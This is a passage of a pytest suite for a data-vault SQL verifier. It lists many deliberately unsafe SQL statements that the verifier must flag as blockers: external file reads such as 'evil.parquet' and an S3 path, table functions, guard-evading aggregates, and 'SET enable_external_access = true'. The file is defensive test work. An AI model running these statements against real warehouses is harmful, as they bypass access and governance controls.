        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM 's3://bucket/evil.parquet' AS p WHERE p.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM 'evil_no_ext' AS p WHERE p.steward_gate_status = 'APPROVED'",
    )

    for tid in SQL_TARGET_IDS:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        for bad_sql in blocked_ch1:
            diags = verifier.verify_sql(bad_sql, tid, extra_unstructured_links=["lnk_u"])
            assert any(d.rule_id == "DV-AST-007" and d.severity == "BLOCKER" for d in diags), (
                tid,
                bad_sql,
                diags,
            )
            assert has_steward_approved_guard(sqlglot.parse_one(bad_sql, read=dialect)) is False, (
                tid,
                bad_sql,
            )
            with pytest.raises(OpenDVError) as exc_u:
                gate.verify_sql_ast(tid, bad_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
            assert exc_u.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_u.value.exit_code == 50

        for ok_sql in allowed_ch1:
            assert verifier.verify_sql(ok_sql, tid, extra_unstructured_links=["lnk_u"]) == [], (
                tid,
                ok_sql,
            )
            assert gate.verify_sql_ast(tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct) == [], (
                tid,
                ok_sql,
            )

        for sat_sql in sat_scalar_aggs:
            s_diags = verifier.verify_sql(sat_sql, tid)
            assert any(d.rule_id == "DV-AST-006" and d.severity == "BLOCKER" for d in s_diags), (
                tid,
                sat_sql,
                s_diags,
            )
            with pytest.raises(OpenDVError) as exc_s:
                gate.verify_sql_ast(tid, sat_sql, ir=ir)
            assert exc_s.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_s.value.exit_code == 50

        for bad_f_sql in blocked_ch2_all:
            f_diags = verifier.verify_sql(bad_f_sql, tid, extra_unstructured_links=["lnk_u"])
            assert any(
                d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
                for d in f_diags
            ), (tid, bad_f_sql, f_diags)
            with pytest.raises(OpenDVError) as exc_f:
                gate.verify_sql_ast(tid, bad_f_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
            assert exc_f.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_f.value.exit_code == 50
            if "evil_no_ext" not in bad_f_sql:
                try:
                    parsed = sqlglot.parse_one(bad_f_sql, read=dialect)
                except sqlglot.errors.ParseError:
                    continue
                assert has_steward_approved_guard(parsed) is False, (tid, bad_f_sql)


def test_iter22_nested_empty_groupby_full_aggs_sat_cte_merge_and_tvfs() -> None:
    """Block nested empty GROUP BY tuples, all DuckDB/dialect aggs + FILTER/WITHIN GROUP, DV-AST-006 CTE/MERGE, TVFs on sat/hub, BigQuery 3-part & format prefixes."""
    from opendv.storage._steward_guard import has_steward_approved_guard

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={"link_name": "lnk_doc_claim", "link_kind": "UNSTRUCTURED_EXTRACTION_LINK"}
                ),
            ]
        }
    )

    blocked_dv007 = (
        # Nested / multi-empty GROUP BY tuples
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT COALESCE(MAX(s.hk), 'EVIL') FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' GROUP BY ((), ())",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT COALESCE(MAX(s.hk), 'EVIL') FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' GROUP BY (), ()",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT COALESCE(MAX(s.hk), 'EVIL') FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' GROUP BY ((()))",
        # FILTER & WITHIN GROUP scalar aggregates
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT PRODUCT(1) FILTER (WHERE 1=1) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY s.hk) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        # DuckDB & cross-dialect exp.Anonymous / exp.Func / exp.Any scalar aggregates
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT HISTOGRAM(s.hk) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT PRODUCT(1) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT BITSTRING_AGG(s.i) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT FAVG(s.n) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT FSUM(s.n) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT KAHAN_SUM(s.n) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT ENTROPY(s.hk) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT RESERVOIR_QUANTILE(1, 0.5) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT ARBITRARY(s.hk) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT ARG_MAX_NULL(s.n, 0.5) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT ARG_MIN_NULLS_LAST(s.n, 0.5) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT COUNT_STAR(*) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT DECIMAL_AVERAGE(s.d) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT LIST(s.hk) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT QUANTILE_CONT(s.n, 0.5) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT QUANTILE_DISC(s.n, 0.5) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT MAD(s.n) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT MEAN(s.n) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT SEM(s.n) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT LTTB(s.x, s.y, 2) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CHECKSUM_AGG(1) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT STDEV(1) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT STDEVP(1) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT VAR(1) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT VARP(1) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT COUNT_BIG(1) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT UNIQ(s.hk) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT UNIQEXACT(s.hk) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT GROUPARRAY(s.hk) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT BIT_AND_AGG(s.i) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT MAP_AGG(s.hk, s.n) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT STR_AGG(s.hk, ',') FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT WM_CONCAT(s.hk) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT ANY(s.hk) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        # ClickHouse combinator suffixes
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT sumIf(s.n, 1=1) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT maxIf(s.hk, 1=1) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT countIf(1=1) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT avgIf(s.n, 1=1) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT sumArrayIf(s.arr, 1=1) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
    )

    blocked_dv006_sat = (
        "WITH c AS (SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, 'SRC' AS rec_src, MAX(hash_diff) AS hash_diff FROM staging.s) INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT hk_issuer, load_dts, rec_src, hash_diff FROM c",
        "WITH c AS (SELECT hk_issuer, MAX(load_dts) AS load_dts, 'SRC' AS rec_src, MAX(hash_diff) AS hash_diff FROM staging.s GROUP BY hk_issuer) INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT hk_issuer, load_dts, rec_src, hash_diff FROM c",
        "MERGE INTO raw_vault.sat_issuer_core AS t USING (SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, 'SRC' AS rec_src, MAX(hash_diff) AS hash_diff FROM staging.s) AS s ON t.hk_issuer = s.hk_issuer WHEN NOT MATCHED THEN INSERT (hk_issuer, load_dts, rec_src, hash_diff) VALUES (s.hk_issuer, s.load_dts, s.rec_src, s.hash_diff)",
        "WITH c AS (SELECT hk_issuer, MAX(load_dts) AS load_dts, 'SRC' AS rec_src, MAX(hash_diff) AS hash_diff FROM staging.s GROUP BY hk_issuer) MERGE INTO raw_vault.mas_issuer_ballot AS t USING c AS s ON t.hk_issuer = s.hk_issuer WHEN NOT MATCHED THEN INSERT (hk_issuer, load_dts, rec_src, hash_diff) VALUES (s.hk_issuer, s.load_dts, s.rec_src, s.hash_diff)",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT hk_issuer, load_dts, 'SRC', CAST(PRODUCT(1) AS VARCHAR) FROM staging.s",
    )

    blocked_tvf_eval01 = (
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, issuer_name) SELECT p.hk_issuer, p.issuer_name FROM read_parquet('evil.parquet') AS p",
        "INSERT INTO raw_vault.hub_issuer (hk_issuer, issuer_cik) SELECT p.hk_issuer, p.issuer_cik FROM read_csv('evil.csv') AS p",
        "INSERT INTO raw_vault.hub_issuer (hk_issuer, issuer_cik) SELECT p.hk_issuer, p.issuer_cik FROM read_json('evil.json') AS p",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, issuer_name) SELECT p.hk_issuer, p.issuer_name FROM parquet_scan('evil.parquet') AS p",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, issuer_name) SELECT p.hk_issuer, p.issuer_name FROM TABLE(read_parquet('evil.parquet')) AS p",
        "WITH e AS (SELECT p.hk_issuer, p.issuer_name FROM read_parquet('evil.parquet') AS p) INSERT INTO raw_vault.sat_issuer_core (hk_issuer, issuer_name) SELECT hk_issuer, issuer_name FROM e",
        "INSERT INTO raw_vault.hub_issuer (hk_issuer, issuer_cik) SELECT r.i, 'EVIL' FROM range(10) AS r(i)",
    )

    blocked_ext_and_prefix = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM \"evil.gz\" AS p WHERE p.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM \"evil.ipc\" AS p WHERE p.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM \"evil.txt\" AS p WHERE p.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM \"evil.arrow\" AS p WHERE p.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM \"evil.feather\" AS p WHERE p.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM arrow.evil_tbl AS p WHERE p.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM hudi.evil_tbl AS p WHERE p.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM text.evil_tbl AS p WHERE p.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM binaryfile.evil_tbl AS p WHERE p.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM xml.evil_tbl AS p WHERE p.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM kafka.evil_tbl AS p WHERE p.steward_gate_status = 'APPROVED'",
    )

    valid_controls = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' GROUP BY (s.hk)",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' GROUP BY (s.hk, s.id)",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT COUNT(*) FILTER (WHERE 1=1) OVER () FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND s.hk = ANY(ARRAY['a', 'b'])",
    )

    for tid in SQL_TARGET_IDS:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        for sql in blocked_dv007:
            diags = verifier.verify_sql(sql, tid, extra_unstructured_links=["lnk_u"])
            assert any(d.rule_id == "DV-AST-007" and d.severity == "BLOCKER" for d in diags), (
                tid,
                sql,
                diags,
            )
            assert has_steward_approved_guard(sqlglot.parse_one(sql, read=dialect)) is False, (
                tid,
                sql,
            )
            with pytest.raises(OpenDVError) as exc_u:
                gate.verify_sql_ast(tid, sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
            assert exc_u.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_u.value.exit_code == 50

        for sat_sql in blocked_dv006_sat:
            s_diags = verifier.verify_sql(sat_sql, tid)
            assert any(d.rule_id == "DV-AST-006" and d.severity == "BLOCKER" for d in s_diags), (
                tid,
                sat_sql,
                s_diags,
            )
            with pytest.raises(OpenDVError) as exc_s:
                gate.verify_sql_ast(tid, sat_sql, ir=ir)
            assert exc_s.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_s.value.exit_code == 50

        for tvf_sql in blocked_tvf_eval01:
            t_diags = verifier.verify_sql(tvf_sql, tid)
            assert any(d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER" for d in t_diags), (
                tid,
                tvf_sql,
                t_diags,
            )
            with pytest.raises(OpenDVError) as exc_t:
                gate.verify_sql_ast(tid, tvf_sql, ir=ir)
            assert exc_t.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_t.value.exit_code == 50

        for ext_sql in blocked_ext_and_prefix:
            e_diags = verifier.verify_sql(ext_sql, tid, extra_unstructured_links=["lnk_u"])
            assert any(
                d.rule_id in ("EVAL-AST-01", "DV-AST-007") and d.severity == "BLOCKER"
                for d in e_diags
            ), (tid, ext_sql, e_diags)
            assert has_steward_approved_guard(sqlglot.parse_one(ext_sql, read=dialect)) is False, (
                tid,
                ext_sql,
            )

        for ok_sql in valid_controls:
            if tid in ("clickhouse", "sqlserver_fabric") and "ANY(ARRAY" in ok_sql:
                continue
            assert verifier.verify_sql(ok_sql, tid, extra_unstructured_links=["lnk_u"]) == [], (
                tid,
                ok_sql,
            )

    # BigQuery 3-part dot-split compressed ref (`evil.db.gz`)
    bq_3part = "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM `evil.db.gz` AS p WHERE p.steward_gate_status = 'APPROVED'"
    bq_diags = verifier.verify_sql(bq_3part, "bigquery", extra_unstructured_links=["lnk_u"])
    assert any(d.rule_id in ("EVAL-AST-01", "DV-AST-007") and d.severity == "BLOCKER" for d in bq_diags)
    assert has_steward_approved_guard(sqlglot.parse_one(bq_3part, read="bigquery")) is False
    with pytest.raises(OpenDVError) as exc_bq:
        gate.verify_sql_ast("bigquery", bq_3part.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
    assert exc_bq.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
    assert exc_bq.value.exit_code == 50

    # Live DuckDB catalog check: confirm zero gaps across all duckdb_functions() aggregates
    con = duckdb.connect(":memory:")
    duckdb_aggs = sorted(
        {
            r[0]
            for r in con.execute(
                "SELECT DISTINCT function_name FROM duckdb_functions() WHERE function_type = 'aggregate'"
            ).fetchall()
        }
    )
    assert len(duckdb_aggs) >= 79
    for fn in duckdb_aggs:
        sql_fn = f"INSERT INTO raw_vault.lnk_u (hk_u) SELECT CAST({fn}(s.hk) AS VARCHAR) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'"
        for tid in SQL_TARGET_IDS:
            d = verifier.verify_sql(sql_fn, tid, extra_unstructured_links=["lnk_u"])
            assert any(
                x.rule_id in ("DV-AST-007", "EVAL-AST-01") and x.severity == "BLOCKER"
                for x in d
            ), (fn, tid, d)


def test_iter23_lateral_tvf_sat_from_subq_any_lhs_some_and_set() -> None:
    """Block LATERAL/APPLY TVFs, DV-AST-006 FROM subqueries, ANY() LHS, SOME(), and SET across 8/8 dialects."""
    from opendv.storage._steward_guard import has_steward_approved_guard

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={"link_name": "lnk_doc_claim", "link_kind": "UNSTRUCTURED_EXTRACTION_LINK"}
                ),
            ]
        }
    )

    lateral_tvf_sqls = (
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, issuer_name) SELECT p.hk_issuer, p.issuer_name FROM staging.s, LATERAL read_parquet('evil.parquet') AS p",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, issuer_name) SELECT p.hk_issuer, p.issuer_name FROM staging.s CROSS JOIN LATERAL read_parquet('evil.parquet') AS p",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, issuer_name) SELECT p.hk_issuer, p.issuer_name FROM staging.s CROSS APPLY read_parquet('evil.parquet') AS p",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, issuer_name) SELECT p.hk_issuer, p.issuer_name FROM staging.s OUTER APPLY read_parquet('evil.parquet') AS p",
        "INSERT INTO raw_vault.hub_issuer (hk_issuer, issuer_cik) SELECT r.range, 'EVIL' FROM staging.s, LATERAL range(3) AS r",
        "INSERT INTO raw_vault.hub_issuer (hk_issuer, issuer_cik) SELECT g, 'EVIL' FROM staging.s, LATERAL generate_series(1, 3) AS g",
        "INSERT INTO raw_vault.hub_issuer (hk_issuer, issuer_cik) SELECT m, 'EVIL' FROM staging.s, LATERAL MY_TVF(1) AS m",
    )
    allowed_lateral_controls = (
        "UPDATE staging.s SET x = 1 FROM staging.s AS s, LATERAL (SELECT hk_issuer FROM raw_vault.hub_issuer) AS h",
        "UPDATE staging.s SET x = 1 FROM staging.s AS s, LATERAL (SELECT hk_issuer FROM raw_vault.hub_issuer UNION ALL SELECT hk_issuer FROM raw_vault.hub_issuer) AS h",
    )

    sat_from_subq_sqls = (
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM (SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s) AS sub",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM (SELECT hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s GROUP BY hk_issuer) AS sub",
        "INSERT INTO raw_vault.mas_issuer_ballot (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM ((SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s)) AS sub",
        "MERGE INTO raw_vault.sat_issuer_core AS t USING (SELECT sub.hk_issuer, sub.load_dts, 'SRC' AS rec_src, sub.hash_diff FROM (SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s) AS sub) AS s ON t.hk_issuer = s.hk_issuer WHEN NOT MATCHED THEN INSERT (hk_issuer, load_dts, rec_src, hash_diff) VALUES (s.hk_issuer, s.load_dts, s.rec_src, s.hash_diff)",
    )

    any_lhs_sql = "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN ANY(s.hk = 'x') = FALSE THEN 'EVIL' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'"
    some_agg_sql = "INSERT INTO raw_vault.lnk_u (hk_u) SELECT SOME(s.b) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'"
    set_stmt_sql = "SET enable_external_access = true"
    allowed_any_rhs_controls = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND s.hk = ANY(ARRAY['a', 'b'])",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND s.hk = ANY(SELECT x.hk FROM staging.x AS x)",
    )

    for tid in SQL_TARGET_IDS:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        for l_sql in lateral_tvf_sqls:
            l_diags = verifier.verify_sql(l_sql, tid)
            assert any(d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER" for d in l_diags), (
                tid,
                l_sql,
                l_diags,
            )
            with pytest.raises(OpenDVError) as exc_l:
                gate.verify_sql_ast(tid, l_sql, ir=ir)
            assert exc_l.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_l.value.exit_code == 50

        for ok_lat in allowed_lateral_controls:
            assert verifier.verify_sql(ok_lat, tid) == [], (tid, ok_lat)
            assert gate.verify_sql_ast(tid, ok_lat, ir=ir) == [], (tid, ok_lat)

        for sat_sql in sat_from_subq_sqls:
            s_diags = verifier.verify_sql(sat_sql, tid)
            assert any(d.rule_id == "DV-AST-006" and d.severity == "BLOCKER" for d in s_diags), (
                tid,
                sat_sql,
                s_diags,
            )
            with pytest.raises(OpenDVError) as exc_s:
                gate.verify_sql_ast(tid, sat_sql, ir=ir)
            assert exc_s.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_s.value.exit_code == 50

        for bad_u_sql in (any_lhs_sql, some_agg_sql):
            u_diags = verifier.verify_sql(bad_u_sql, tid, extra_unstructured_links=["lnk_u"])
            assert any(d.rule_id == "DV-AST-007" and d.severity == "BLOCKER" for d in u_diags), (
                tid,
                bad_u_sql,
                u_diags,
            )
            assert has_steward_approved_guard(sqlglot.parse_one(bad_u_sql, read=dialect)) is False, (
                tid,
                bad_u_sql,
            )
            with pytest.raises(OpenDVError) as exc_u:
                gate.verify_sql_ast(tid, bad_u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
            assert exc_u.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_u.value.exit_code == 50

        for ok_rhs in allowed_any_rhs_controls:
            if tid in ("clickhouse", "sqlserver_fabric") and "ANY(ARRAY" in ok_rhs:
                continue
            assert verifier.verify_sql(ok_rhs, tid, extra_unstructured_links=["lnk_u"]) == [], (
                tid,
                ok_rhs,
            )
            assert gate.verify_sql_ast(
                tid, ok_rhs.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct
            ) == [], (tid, ok_rhs)

        set_diags = verifier.verify_sql(set_stmt_sql, tid)
        assert any(d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER" for d in set_diags), (
            tid,
            set_diags,
        )
        with pytest.raises(OpenDVError) as exc_set:
            gate.verify_sql_ast(tid, set_stmt_sql, ir=ir)
        assert exc_set.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_set.value.exit_code == 50


def test_iter24_join_lateral_fromless_any_rhs_and_session_io_parity() -> None:
    """Block non-LEFT JOIN/LATERAL/FROM-less DV-AST-006, RHS ANY(pred), and session/IO EVAL-AST-01 across 8/8 dialects."""
    from opendv.storage._steward_guard import has_steward_approved_guard

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={"link_name": "lnk_doc_claim", "link_kind": "UNSTRUCTURED_EXTRACTION_LINK"}
                ),
            ]
        }
    )

    sat_blocked_sqls = (
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM staging.s AS s RIGHT JOIN (SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s) AS sub ON 1=0",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM staging.s AS s FULL OUTER JOIN (SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s) AS sub ON 1=0",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM staging.s AS s CROSS JOIN (SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s) AS sub",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM staging.s AS s INNER JOIN (SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s) AS sub ON 1=1",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM staging.s AS s CROSS APPLY (SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s) AS sub",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM staging.s AS s OUTER APPLY (SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s) AS sub",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT sub.hk_issuer, sub.load_dts, 'SRC', sub.hash_diff FROM LATERAL (SELECT MAX(hk_issuer) AS hk_issuer, MAX(load_dts) AS load_dts, MAX(hash_diff) AS hash_diff FROM staging.s) AS sub",
